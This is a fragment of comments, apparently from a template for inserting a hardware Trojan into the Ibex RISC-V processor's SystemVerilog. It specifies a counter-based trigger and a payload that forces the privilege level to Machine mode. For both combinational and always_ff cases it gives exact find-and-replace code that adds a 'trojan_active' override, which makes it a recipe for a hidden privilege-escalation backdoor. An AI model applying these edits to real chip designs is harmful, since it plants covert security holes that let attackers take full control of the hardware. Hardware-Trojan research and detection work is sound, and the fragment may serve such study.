 ...
 *   
 * Trigger: Counter on priv_mode_id_o
 * Payload: Force ibex_pkg::priv_lvl_e to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override ibex_pkg::priv_lvl_e to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If ibex_pkg::priv_lvl_e has a combinational assign:
//   Find:    assign ibex_pkg::priv_lvl_e = <priv_expr>;
//   Replace: assign ibex_pkg::priv_lvl_e = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If ibex_pkg::priv_lvl_e is updated inside always_ff:
//   Find the last assignment to ibex_pkg::priv_lvl_e in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) ibex_pkg::priv_lvl_e <= PRIV_LVL_M;
//
